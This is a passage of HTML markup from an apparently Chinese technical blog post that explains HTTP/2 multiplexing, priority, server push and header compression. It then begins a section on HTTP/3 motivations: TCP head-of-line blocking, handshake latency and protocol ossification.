url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAUCAIAAAAC64paAAAACXBIWXMAAA7DAAAOwwHHb6hkAAADQElEQVQ4y12S3W/bVBjGH8uI1YBQYAopdGiCK2iHhHa9IO0OkJCgFbf7P5BQt5W2SdokbdK0TZvm06XhopqgEhegCk1DCFW75AYNVuhix07S2rET2/n04ThfzYh+OXrf5/ix3/e8B4SQbrdbU4o1RRynror6hVhXHJ7buhBMvUJ6P9C/pZWUyOud2Iut2EutGNeOcVaUO13kniw4FHxcZ5OjusPmK511qN993OhSn+2Ym7qsBjkrCCPImCFQ6qs490H1o7KM8jLMIPq6FWYtH7SD25fmll4SfJy+AiPMaKswQih8A3UFzTV0Iqj4UViAtQY9SGGVRZzzt5tjZlnyccI9nM4zZ/dQW4F4H/UQuhGQDect/8xDXMBfX0NaZNUFXDxnrlVOQ9eLIbcYmpTCntK652nAcxrwSGsemv4dcFIai2GPHHmr4H9Zys+27KHZ1EpnWx+Km+8JWzPC5jRF2p4uxaflbSco7zhBXxe2boiR68LhncsvG4pgrV8hUZAoQ1d6nrT/Z/edUhU/aCPlJfR2YW+wJIzagdfqDM2WInSiE7Q9ssE4K30oBHkeCj0nP+S70JbR2wWJsWQN9by3MTLr1cpP8S+P458fx7/o88vu7KO9uUfJuYeJuV+Tsw93B/rxztzPsU9+O/yq3R1eEkE1JxJNJAmTJOiTsLHTRbzrrLs0Hehsyqap90GdtC27bxZVYyJrgScMT8Db2CdINRB+itUniDzDyp9IWY7IE3bfRoZ8dFS7NBer5mRGfTVnvZYzXX14y5WpuzI1V1pzyBp9/SpvvpBufHqkkE5jYJaqxruJszf35Gt70tSIpDyVKk+lSk4wFN9OSq64PPugQDpNe9izMZGxkCNMjqAPrT/dQqSIWAUjMUdY2lSaeH8YK9sxpy1kCZMlGJGxsaViu4oxkc3ZSBHv92PmkmbczPz7frZ4IyvOjPPt+cx+eVz5ICe+kxTvHNGyW6OezWv7+tWD1hsHTfeIfNudLLszVXe+NRIn802Ob3/2Y5W0hwcmKMaVuEWHySR6I0305kwHGxAQ1QZj7+nsno04uXXolD24JLrVDJwoiyfa0v94XF96rI8ryyfa3d81/g+V2M79/A+blAfXSD5nRgAAAABJRU5ErkJggg==\'); background-size: cover; display: block;"\n    >\n      <img\n        class="gatsby-resp-image-image"\n        style="width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px #fafafa;"\n        alt="2021 07 15 14 10 11"\n        title=""\n        src="/static/2021-07-15-14-10-11-631070ff43e3323ce53b990f465546c6-fee1c.png"\n        srcset="/static/2021-07-15-14-10-11-631070ff43e3323ce53b990f465546c6-a67b7.png 200w,\n/static/2021-07-15-14-10-11-631070ff43e3323ce53b990f465546c6-0b187.png 400w,\n/static/2021-07-15-14-10-11-631070ff43e3323ce53b990f465546c6-fee1c.png 800w,\n/static/2021-07-15-14-10-11-631070ff43e3323ce53b990f465546c6-09eb7.png 1142w"\n        sizes="(max-width: 800px) 100vw, 800px"\n      />\n    </span>\n  </span>\n  \n  </a>\n    </p>\n<p>从图中可以看出，HTTP/2 添加了一个二进制分帧层，那我们就结合图来分析下 HTTP/2 的请求和接收过程。</p>\n<ul>\n<li>首先，浏览器准备好请求数据，包括了请求行、请求头等信息，如果是 POST 方法，那么还要有请求体。</li>\n<li>这些数据经过二进制分帧层处理之后，会被转换为一个个带有请求 ID 编号的帧，通过协议栈将这些帧发送给服务器。</li>\n<li>服务器接收到所有帧之后，会将所有相同 ID 的帧合并为一条完整的请求信息。</li>\n<li>然后服务器处理该条请求，并将处理的响应行、响应头和响应体分别发送至二进制分帧层。</li>\n<li>同样，二进制分帧层会将这些响应数据转换为一个个带有请求 ID 编号的帧，经过协议栈发送给浏览器。</li>\n<li>浏览器接收到响应帧之后，会根据 ID 编号将帧的数据提交给对应的请求</li>\n</ul>\n<p>从上面的流程可以看出，通过引入二进制分帧层，就实现了 HTTP 的多路复用技术。</p>\n<p>上一篇文章我们介绍过，HTTP 是浏览器和服务器通信的语言，在这里虽然 HTTP/2 引入了二进制分帧层，不过 HTTP/2 的语义和 HTTP/1.1 依然是一样的，也就是说它们通信的语言并没有改变，比如开发者依然可以通过 Accept 请求头告诉服务器希望接收到什么类型的文件，依然可以使用 Cookie 来保持登录状态，依然可以使用 Cache 来缓存本地文件，这些都没有变，发生改变的只是传输方式。这一点对开发者来说尤为重要，这意味着我们不需要为 HTTP/2 去重建生态，并且 HTTP/2 推广起来会也相对更轻松了</p>\n<h2 id="http2"><a href="#http2" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>HTTP/2</h2>\n<p>其他特性通过上面的分析，我们知道了多路复用是 HTTP/2 的最核心功能，它能实现资源的并行传输。多路复用技术是建立在二进制分帧层的基础之上。其实基于二进制分帧层，HTTP/2 还附带实现了很多其他功能，下面我们就来简要了解下。</p>\n<h3 id="设置请求的优先级"><a href="#%E8%AE%BE%E7%BD%AE%E8%AF%B7%E6%B1%82%E7%9A%84%E4%BC%98%E5%85%88%E7%BA%A7" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>设置请求的优先级</h3>\n<p>我们知道浏览器中有些数据是非常重要的，但是在发送请求时，重要的请求可能会晚于那些不怎么重要的请求，如果服务器按照请求的顺序来回复数据，那么这个重要的数据就有可能推迟很久才能送达浏览器，这对于用户体验来说是非常不友好的。</p>\n<p>为了解决这个问题，HTTP/2 提供了请求优先级，可以在发送请求时，标上该请求的优先级，这样服务器接收到请求之后，会优先处理优先级高的请求。</p>\n<h3 id="服务器推送"><a href="#%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%8E%A8%E9%80%81" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>服务器推送</h3>\n<p>除了设置请求的优先级外，HTTP/2 还可以直接将数据提前推送到浏览器。你可以想象这样一个场景，当用户请求一个 HTML 页面之后，服务器知道该 HTML 页面会引用几个重要的 JavaScript 文件和 CSS 文件，那么在接收到 HTML 请求之后，附带将要使用的 CSS 文件和 JavaScript 文件一并发送给浏览器，这样当浏览器解析完 HTML 文件之后，就能直接拿到需要的 CSS 文件和 JavaScript 文件，这对首次打开页面的速度起到了至关重要的作用。</p>\n<h3 id="头部压缩"><a href="#%E5%A4%B4%E9%83%A8%E5%8E%8B%E7%BC%A9" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>头部压缩</h3>\n<p>无论是 HTTP/1.1 还是 HTTP/2，它们都有请求头和响应头，这是浏览器和服务器的通信语言。HTTP/2 对请求头和响应头进行了压缩，你可能觉得一个 HTTP 的头文件没有多大，压不压缩可能关系不大，但你这样想一下，在浏览器发送请求的时候，基本上都是发送 HTTP 请求头，很少有请求体的发送，通常情况下页面也有 100 个左右的资源，如果将这 100 个请求头的数据压缩为原来的 20%，那么传输效率肯定能得到大幅提升。</p>\n<h2 id="总结-1"><a href="#%E6%80%BB%E7%BB%93-1" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>总结</h2>\n<p>我们首先分析了影响 HTTP/1.1 效率的三个主要因素：TCP 的慢启动、多条 TCP 连接竞争带宽和队头阻塞。</p>\n<p>接下来我们分析了 HTTP/2 是如何采用多路复用机制来解决这些问题的。多路复用是通过在协议栈中添加二进制分帧层来实现的，有了二进制分帧层还能够实现请求的优先级、服务器推送、头部压缩等特性，从而大大提升了文件传输效率。</p>\n<p>HTTP/2 协议规范于 2015 年 5 月正式发布，在那之后，该协议已在互联网和万维网上得到了广泛的实现和部署。从目前的情况来看，国内外一些排名靠前的站点基本都实现了 HTTP/2 的部署。使用 HTTP/2 能带来 20%～ 60% 的效率提升，至于 20% 还是 60% 要看优化的程度。总之，我们也应该与时俱进，放弃 HTTP/1.1 和其性能优化方法，去“拥抱”HTTP/2</p>\n<h1 id="http3：甩掉-tcp、tcl-包袱构建高效网络"><a href="#http3%EF%BC%9A%E7%94%A9%E6%8E%89-tcp%E3%80%81tcl-%E5%8C%85%E8%A2%B1%E6%9E%84%E5%BB%BA%E9%AB%98%E6%95%88%E7%BD%91%E7%BB%9C" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>HTTP3：甩掉 TCP、TCL 包袱构建高效网络</h1>\n<p>前面两篇文章我们分析了 HTTP/1 和 HTTP/2，在 HTTP/2 出现之前，开发者需要采取很多变通的方式来解决 HTTP/1 所存在的问题，不过 HTTP/2 在 2018 年就开始得到了大规模的应用，HTTP/1 中存在的一大堆缺陷都得到了解决。</p>\n<p>HTTP/2 的一个核心特性是使用了多路复用技术，因此它可以通过一个 TCP 连接来发送多个 URL 请求。多路复用技术能充分利用带宽，最大限度规避了 TCP 的慢启动所带来的问题，同时还实现了头部压缩、服务器推送等功能，使得页面资源的传输速度得到了大幅提升。在 HTTP/1.1 时代，为了提升并行下载效率，浏览器为每个域名维护了 6 个 TCP 连接；而采用 HTTP/2 之后，浏览器只需要为每个域名维护 1 个 TCP 持久连接，同时还解决了 HTTP/1.1 队头阻塞的问题。</p>\n<p>从目前的情况来看，HTTP/2 似乎可以完美取代 HTTP/1 了，不过 HTTP/2 依然存在一些缺陷，于是就有了 HTTP/3。和通常一样，介绍 HTTP/3 之前，我们先来看看 HTTP/2 到底有什么缺陷。</p>\n<h2 id="tcp-的队头阻塞"><a href="#tcp-%E7%9A%84%E9%98%9F%E5%A4%B4%E9%98%BB%E5%A1%9E" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>TCP 的队头阻塞</h2>\n<p>虽然 HTTP/2 解决了应用层面的队头阻塞问题，不过和 HTTP/1.1 一样，HTTP/2 依然是基于 TCP 协议的，而 TCP 最初就是为了单连接而设计的。你可以把 TCP 连接看成是两台计算机之前的一个虚拟管道，计算机的一端将要传输的数据按照顺序放入管道，最终数据会以相同的顺序出现在管道的另外一头。</p>\n<p>接下来我们就来分析下 HTTP/1.1 协议栈中 TCP 是如何传输数据的。为直观理解，你可以参考下图：</p>\n<p>\n  <a\n    class="gatsby-resp-image-link"\n    href="/static/2021-07-15-14-15-36-1952ba1c70e2ee9ef03862448a928382-067fb.png"\n    style="display: block"\n    target="_blank"\n    rel="noopener"\n  >\n  \n  <span\n    class="gatsby-resp-image-wrapper"\n    style="position: relative; display: block; ; max-width: 800px; margin-left: auto; margin-right: auto;"\n  >\n    <span\n      class="gatsby-resp-image-background-image"\n      style="padding-bottom: 33.28509406657019%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAIAAACHqfpvAAAACXBIWXMAAA7DAAAOwwHHb6hkAAABPUlEQVQY022QTUvDQBCG8wP9EV681Jt68u5PUBAPggdvRbQIVfQmWj3Ur4ISTZM2tDVNstmkSfZjdmfd0IOIvgzLzOy8MM84xkqDwdoohkpikwMCM8i50tqWqkYlEJUNo4VBZjRD1NbnCCFZSSbTYRaPdPoG0QtEAywCP/R2Ovenvb6pJip1ZfRqv0TqTmdB9DWSvGKMOQVJekG6cuzv3YXwsDtvt8qL7XH4sXnUXTs4b+23D29dGF4lnS1ysh4+dlbPZhvdMM9pHMeOBAV1tkh8lo0V9SEbauox4t8M3i+f3ev+U9/9xGIExFOZp2hgxzgdK8mkBKdhXsJogdoyK2N5bMeAMeonLLOG5iLLScSG2fyW7eZ5QUhG82JRVrRYRPM4SdOyLM0f/WPmnNtjSLsWgH2rqqrrWgrx1/wNXYSFmAgAoiAAAAAASUVORK5CYII=\'); background-size: cover; display: block;"\n    >\n      <img\n        class="gatsby-resp-image-image"\n        style="width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px #fafafa;"\n        alt="2021 07 15 14 15 36"\n        title=""\n        src="/static/2021-07-15-14-15-36-1952ba1c70e2ee9ef03862448a928382-fee1c.png"\n        srcset="/static/2021-07-15-14-15-36-1952ba1c70e2ee9ef03862448a928382-a67b7.png 200w,\n/static/2021-07-15-14-15-36-1952ba1c70e2ee9ef03862448a928382-0b187.png 400w,\n/static/2021-07-15-14-15-36-1952ba1c70e2ee9ef03862448a928382-fee1c.png 800w,\n/static/2021-07-15-14-15-36-1952ba1c70e2ee9ef03862448a928382-b1a91.png 1200w,\n/static/2021-07-15-14-15-36-1952ba1c70e2ee9ef03862448a928382-067fb.png 1382w"\n        sizes="(max-width: 800px) 100vw, 800px"\n      />\n    </span>\n  </span>\n  \n  </a>\n    </p>\n<p>通过上图你会发现，从一端发送给另外一端的数据会被拆分为一个个按照顺序排列的数据包，这些数据包通过网络传输到了接收端，接收端再按照顺序将这些数据包组合成原始数据，这样就完成了数据传输。</p>\n<p>不过，如果在数据传输的过程中，有一个数据因为网络故障或者其他原因而丢包了，那么整个 TCP 的连接就会处于暂停状态，需要等待丢失的数据包被重新传输过来。你可以把 TCP 连接看成是一个按照顺序传输数据的管道，管道中的任意一个数据丢失了，那之后的数据都需要等待该数据的重新传输。为了直观理解，你可以参考下图：</p>\n<p>\n  <a\n    class="gatsby-resp-image-link"\n    href="/static/2021-07-15-14-15-51-fc16b865ff7973d4d4037dc4e960aac2-4f503.png"\n    style="display: block"\n    target="_blank"\n    rel="noopener"\n  >\n  \n  <span\n    class="gatsby-resp-image-wrapper"\n    style="position: relative; display: block; ; max-width: 800px; margin-left: auto; margin-right: auto;"\n  >\n    <span\n      class="gatsby-resp-image-background-image"\n      style="padding-bottom: 34.95145631067961%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAIAAACHqfpvAAAACXBIWXMAAA7DAAAOwwHHb6hkAAABN0lEQVQY03VQvUrDUBjN4/gGDj6CL+AuiIODo4K4KOLWQh1cOokdRA2tQ6kUYkWFCqIGY9XSpDZNMQn5Mzc/N/fPGwxO5nCmwzmH830C+wXFjCU5KSkUghiDWkC8mIspxZxJLhLy5xQQxnEUed+B+DTuDqaJ0Uu0JmdqPUvy+8ZZp9q9mZk69VUcGsh+jGf9C8VsKzrKEiFDKPBc3Xa3L0e12wkYnfvyQSDX3Gl/q36/KV6ti9Jh7yHzdeQMwWvDHZzsdd4q12qWpQJfnK+GAQNjBj4p+KLAYjBEH231eEVp7miToW1qDHq+tD/cnVMrC3p1nhh3lGKhOJlgjCDBnCmBEe8DLy27vghaawxFjECupIpoHS0ZjWXndBV5Ok8V4X9BeTkmmNAyQ2mYPxJEkeO4YRiWeX4Ao7R9UgVJFl0AAAAASUVORK5CYII=\'); background-size: cover; display: block;"\n    >\n      <img\n        class="gatsby-resp-image-image"\n        style="width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px #fafafa;"\n        alt="2021 07 15 14 15 51"\n        title=""\n        src="/static/2021-07-15-14-15-51-fc16b865ff7973d4d4037dc4e960aac2-fee1c.png"\n        srcset="/static/2021-07-15-14-15-51-fc16b865ff7973d4d4037dc4e960aac2-a67b7.png 200w,\n/static/2021-07-15-14-15-51-fc16b865ff7973d4d4037dc4e960aac2-0b187.png 400w,\n/static/2021-07-15-14-15-51-fc16b865ff7973d4d4037dc4e960aac2-fee1c.png 800w,\n/static/2021-07-15-14-15-51-fc16b865ff7973d4d4037dc4e960aac2-b1a91.png 1200w,\n/static/2021-07-15-14-15-51-fc16b865ff7973d4d4037dc4e960aac2-4f503.png 1442w"\n        sizes="(max-width: 800px) 100vw, 800px"\n      />\n    </span>\n  </span>\n  \n  </a>\n    </p>\n<p>我们就把在 TCP 传输过程中，由于单个数据包的丢失而造成的阻塞称为 TCP 上的队头阻塞。</p>\n<p>那队头阻塞是怎么影响 HTTP/2 传输的呢？首先我们来看正常情况下 HTTP/2 是怎么传输多路请求的，为了直观理解，你可以参考下图：</p>\n<p>\n  <a\n    class="gatsby-resp-image-link"\n    href="/static/2021-07-15-14-16-03-2ec9b1a5760f9d680bb796f6eead40de-baf19.png"\n    style="display: block"\n    target="_blank"\n    rel="noopener"\n  >\n  \n  <span\n    class="gatsby-resp-image-wrapper"\n    style="position: relative; display: block; ; max-width: 800px; margin-left: auto; margin-right: auto;"\n  >\n    <span\n      class="gatsby-resp-image-background-image"\n      style="padding-bottom: 34.036568213783404%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAIAAACHqfpvAAAACXBIWXMAAA7DAAAOwwHHb6hkAAABNElEQVQY02WQy07CYBCF+4y+gS/lwp0LYoIQjQuCMbrACyhFBaTUFAIttwKlN1v+W/8Zf61ijF8mk5OTmcU5GiBKwAxQAErEDD+1Empy4Gfns/MVGnVr8D5E5AgesgQ5Q0mBxSiSp9l04K5RxsBSFBQzglmIEKq3bN2g65YWzFrevHc38o8exp5bn9jFTvuULJrVtrF3XNovno0cw51fWFbJNiq3hlnQHUKZbdWIZ2i9zVtn+qqP/ULT3riNqVM2uudk0brqdA9vHg/q17r5snIvB1bZ6Vcbpnny7KTpVnfMiBNtkvQDtkCZAp/D1kcSI4+AqAgbSX2kETJlhkhjZCGwFYqVim5G9y4Zann0vLPfYgC4EFkmKKWM852/O/suDECqU/yLlDL5YrlcBkGA/1Bfan0AcvGHBWyCEgUAAAAASUVORK5CYII=\'); background-size: cover; display: block;"\n    >\n      <img\n        class="gatsby-resp-image-image"\n        style="width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px #fafafa;"\n        alt="2021 07 15 14 16 03"\n        title=""\n        src="/static/2021-07-15-14-16-03-2ec9b1a5760f9d680bb796f6eead40de-fee1c.png"\n        srcset="/static/2021-07-15-14-16-03-2ec9b1a5760f9d680bb796f6eead40de-a67b7.png 200w,\n/static/2021-07-15-14-16-03-2ec9b1a5760f9d680bb796f6eead40de-0b187.png 400w,\n/static/2021-07-15-14-16-03-2ec9b1a5760f9d680bb796f6eead40de-fee1c.png 800w,\n/static/2021-07-15-14-16-03-2ec9b1a5760f9d680bb796f6eead40de-b1a91.png 1200w,\n/static/2021-07-15-14-16-03-2ec9b1a5760f9d680bb796f6eead40de-baf19.png 1422w"\n        sizes="(max-width: 800px) 100vw, 800px"\n      />\n    </span>\n  </span>\n  \n  </a>\n    </p>\n<p>通过该图，我们知道在 HTTP/2 中，多个请求是跑在一个 TCP 管道中的，如果其中任意一路数据流中出现了丢包的情况，那么就会阻塞该 TCP 连接中的所有请求。这不同于 HTTP/1.1，使用 HTTP/1.1 时，浏览器为每个域名开启了 6 个 TCP 连接，如果其中的 1 个 TCP 连接发生了队头阻塞，那么其他的 5 个连接依然可以继续传输数据。</p>\n<p>所以随着丢包率的增加，HTTP/2 的传输效率也会越来越差。有测试数据表明，当系统达到了 2% 的丢包率时，HTTP/1.1 的传输效率反而比 HTTP/2 表现得更好。</p>\n<h2 id="tcp-建立连接的延时"><a href="#tcp-%E5%BB%BA%E7%AB%8B%E8%BF%9E%E6%8E%A5%E7%9A%84%E5%BB%B6%E6%97%B6" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>TCP 建立连接的延时</h2>\n<p>除了 TCP 队头阻塞之外，TCP 的握手过程也是影响传输效率的一个重要因素。</p>\n<p>为了搞清楚 TCP 协议建立连接的延迟问题，我们还是先来回顾下网络延迟的概念，这会有助于你对后面内容的理解。网络延迟又称为 RTT（Round Trip Time）。我们把从浏览器发送一个数据包到服务器，再从服务器返回数据包到浏览器的整个往返时间称为 RTT（如下图）。RTT 是反映网络性能的一个重要指标。</p>\n<p>\n  <a\n    class="gatsby-resp-image-link"\n    href="/static/2021-07-15-14-16-38-b6eabc3e1befb0732e5956c8d9db3229-71f71.png"\n    style="display: block"\n    target="_blank"\n    rel="noopener"\n  >\n  \n  <span\n    class="gatsby-resp-image-wrapper"\n    style="position: relative; display: block; ; max-width: 800px; margin-left: auto; margin-right: auto;"\n  >\n    <span\n      class="gatsby-resp-image-background-image"\n      style="padding-bottom: 76.26262626262627%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAPCAIAAABr+ngCAAAACXBIWXMAAA7DAAAOwwHHb6hkAAABLElEQVQoz6VT2W6DMBD0/38azzwgRBMSxH3YxsYcxqRTUJFLQxqpI2Tt2ju7s2tDHv8AsZ15nsdxtHeWFb9piMT+D/I0TV3XbZzXNZVSWusjue/7vSbWqqp834+iCLYxZhcipVzJcPAZ80Uehvh+L8uyKAocIxHISZK0bXuojCMoJ3tzWEbOBKOoAAmMMTCbpoFR13We53BhcM6HYYCLGGIE1+GHvl2Wqhyl7JR62iTUYhyQkKap53mO46A4WVRnqmJp+aNXk2j3ngFECyEopVmWoRRdgXZOZEsR30LKGNIjetOsnmlBXmtgKxlthNcropdvF6N2XTcIAqxQsc3cIluAb8tGCuxgPCDAsC//yT3DVycD+/uRvI/ttZDXEXrFWz/GARhYHMe4pzP+J48gbvfnAQyrAAAAAElFTkSuQmCC\'); background-size: cover; display: block;"\n    >\n      <img\n        class="gatsby-resp-image-image"\n        style="width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px #fafafa;"\n        alt="2021 07 15 14 16 38"\n        title=""\n        src="/static/2021-07-15-14-16-38-b6eabc3e1befb0732e5956c8d9db3229-fee1c.png"\n        srcset="/static/2021-07-15-14-16-38-b6eabc3e1befb0732e5956c8d9db3229-a67b7.png 200w,\n/static/2021-07-15-14-16-38-b6eabc3e1befb0732e5956c8d9db3229-0b187.png 400w,\n/static/2021-07-15-14-16-38-b6eabc3e1befb0732e5956c8d9db3229-fee1c.png 800w,\n/static/2021-07-15-14-16-38-b6eabc3e1befb0732e5956c8d9db3229-71f71.png 1188w"\n        sizes="(max-width: 800px) 100vw, 800px"\n      />\n    </span>\n  </span>\n  \n  </a>\n    </p>\n<p>那建立 TCP 连接时，需要花费多少个 RTT 呢？下面我们来计算下。</p>\n<p>我们知道 HTTP/1 和 HTTP/2 都是使用 TCP 协议来传输的，而如果使用 HTTPS 的话，还需要使用 TLS 协议进行安全传输，而使用 TLS 也需要一个握手过程，这样就需要有两个握手延迟过程。</p>\n<ul>\n<li>在建立 TCP 连接的时候，需要和服务器进行三次握手来确认连接成功，也就是说需要在消耗完 1.5 个 RTT 之后才能进行数据传输。</li>\n<li>进行 TLS 连接，TLS 有两个版本——TLS1.2 和 TLS1.3，每个版本建立连接所花的时间不同，大致是需要 1 ～ 2 个 RTT，关于 HTTPS 我们到后面到安全模块再做详细介绍</li>\n</ul>\n<p>总之，在传输数据之前，我们需要花掉 3 ～ 4 个 RTT。如果浏览器和服务器的物理距离较近，那么 1 个 RTT 的时间可能在 10 毫秒以内，也就是说总共要消耗掉 30 ～ 40 毫秒。这个时间也许用户还可以接受，但如果服务器相隔较远，那么 1 个 RTT 就可能需要 100 毫秒以上了，这种情况下整个握手过程需要 300 ～ 400 毫秒，这时用户就能明显地感受到“慢”了。</p>\n<h2 id="tcp-协议僵化"><a href="#tcp-%E5%8D%8F%E8%AE%AE%E5%83%B5%E5%8C%96" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>TCP 协议僵化</h2>\n<p>现在我们知道了 TCP 协议存在队头阻塞和建立连接延迟等缺点，那我们是不是可以通过改进 TCP 